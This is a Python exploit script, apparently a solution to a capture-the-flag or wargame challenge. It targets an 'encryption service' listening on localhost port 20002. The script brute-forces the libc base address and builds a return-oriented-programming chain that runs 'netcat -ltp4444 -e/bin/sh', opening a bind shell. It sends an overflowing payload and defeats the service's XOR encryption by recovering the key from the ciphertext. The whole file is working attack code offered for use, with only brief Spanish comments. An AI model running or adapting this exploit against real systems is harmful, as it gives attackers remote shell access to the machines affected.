#!/usr/bin/python

from socket import *  
from struct import *

def xor_strings(s1,s2):  
        #print("Xoring strings {0}/{1}".format(len(s1),len(s2)))
        array = []
        i = 0
        for c in s1:
                array.append(chr(ord(c) ^ ord(s2[i])))
                i = i +1
        xored = "".join(array)
        return xored

for off in range(0xb7000000, 0xb8000000, 0x1000):  
        p = ''

        # This ROP Exploit has been generated for a shared object.
        # The addresses of the gadgets will need to be adjusted.
        # Set this variable to the offset of the shared library
        #off = 0xb7623000  # First version libc base
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c0) # @ .data
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /usr
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c4) # @ .data + 4
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/bin" # /bin
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c8) # @ .data + 8
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /net
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cc) # @ .data + 12
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/ncA" # catA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cf) # @ .data + 15
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-lnp" # -lnp
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d4) # @ .data + 20
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "4444" # 4444
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d8) # @ .data + 24
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-e/b" # -e/b
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789dd) # @ .data + 29
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "in/s" # in/s
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e1) # @ .data + 33
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "hAAA" # hAAA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e2) # @ .data + 34
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # hasta aqui:
        #(gdb) x/3s 0xb75e1000 + 0x001789c0
        #0xb77599c0 <map>:       "/usr/bin/netcat"
        #0xb77599d0 <buf>:       "-ltp4444"
        #0xb77599d9 <buffer+1>:  "-e/bin/sh"
        # 73
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        # ecx -> .data despues de ultimo argumento
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        # eax -> cadena comanddo
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete la direccion del comando en data + 35
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e7) # @ .data + 39
        p += "AAAA" # padding
        # ecx -> data + 39
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        # eax -> direccion primer argumento
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # ecx -> mete la direccion del primer argumento en data + 39
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789eb) # @ .data + 43
        p += "AAAA" # padding
        # ecx -> data +43
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        # eax -> direccion segundo parametro
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete la direccion del segundo parametro en data + 43
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete en 0 en data + 47
        p += pack("<I", off + 0x00018f4e) # pop ebx ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        # mete direccion del comando en ebx
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        # mete direccion donde esta la direccion del comando en ecx
        p += pack("<I", off + 0x00001a9e) # pop edx ; ret
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        # mete direccion de 0 en edx
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x0002dd35) # int 0x80

        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20002))
        #print("Trying libc base: " + str(hex(off)))
        offset = 16
        payload = "A"*(131072 + offset) + p
        op = "E"
        size = pack("<I", len(payload))
        #print("Sending payload: " + str(len(payload)))
        s.send(op + size + payload)
        banner_size = len("[-- Enterprise configuration file encryption service --]\n[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
        #print("Skipping banner: " + str(banner_size))
        s.recv(banner_size)
        cipher_size = unpack("<I", s.recv(4))[0]
        #print("Cipher size: " + str(cipher_size))
        ciphertext = ""
        while(len(ciphertext) < cipher_size):
                ciphertext += s.recv(cipher_size-len(ciphertext))
        #print("Received a cipher block of {0} bytes ({1})".format(cipher_size, len(ciphertext)))
        #print("Decryting key")
        key = xor_strings(payload, ciphertext)
        #print("Resending ciphered payload")
        s.send(op + size + xor_strings(payload,key))
        s.send("Q")
        s.close()